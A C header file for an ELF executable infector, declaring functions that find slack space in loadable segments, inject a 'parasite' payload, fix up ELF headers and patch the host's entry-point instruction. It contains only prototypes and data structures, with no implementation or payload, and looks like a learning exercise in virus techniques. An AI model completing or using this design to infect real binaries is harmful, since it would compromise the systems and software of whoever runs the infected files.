#ifndef INFECTOR_H
#define INFECTOR_H

#include <stdbool.h>
#include <libelf.h>
#include <gelf.h>

#define MAX_SCOP_LOADS 4
#define OPCODES_SIZE 50
#define GET_RIP_OFFSET 0x3a

typedef struct {
    GElf_Phdr loads[MAX_SCOP_LOADS];
    size_t count;
} ScopHeaders;

typedef struct {
    uint8_t raw_machine_code[OPCODES_SIZE];
} Opcodes;

typedef struct {
    uint64_t lea_address;       
    size_t   lea_size;          
    uint64_t next_rip;
    uint64_t target_address;
    int64_t  displacement;
    int      found;
} InstructionData;

bool validate_scop_compliance_and_extract_scop_headers(Elf *elf, ScopHeaders *out_headers);
uint64_t calculate_available_slack_space(const ScopHeaders *out_headers);
uint64_t injection_vector(const ScopHeaders *out_headers);
uint64_t injection_vaddr(const ScopHeaders *out_headers);
uint64_t get_elf_entry_point(Elf *elf);
bool extract_entry_opcodes(int fd, const ScopHeaders *out_headers, uint64_t target_vaddr, size_t bytes_to_read, Opcodes *output_opcodes);
InstructionData find_rip_target(const uint8_t *code, size_t code_size, uint64_t start_address);
bool find_section_that_end_at_parasite_start(Elf *elf, uint64_t parasite_offset, 
                                             GElf_Shdr *out_shdr, size_t *out_index);
bool load_parasite_file(const char *path, uint8_t *buffer, size_t *out_size);
bool patch_parasite_delta(uint8_t *parasite, size_t size, int64_t delta);
bool parasite_size_less_then_slack_space(size_t parasite_size, size_t slack_space);
bool update_elf_headers(int fd, uint64_t pt_load1_phdr_offset, 
                        uint64_t new_filesz, uint64_t new_memsz);
bool update_elf_fini_section(int fd, uint64_t fini_section_offset, 
                        uint64_t new_sh_size);
bool patch_host_entry_point(int fd, uint64_t lea_file_offset, 
                            int32_t new_displacement);
bool inject_parasite(int host_fd, uint64_t injection_offset, 
                     const uint8_t *parasite, size_t parasite_size);
uint64_t get_pt_load_phdr_offset(Elf *elf, const GElf_Phdr *target_phdr);
uint64_t get_section_header_offset(Elf *elf, size_t shndx);

#endif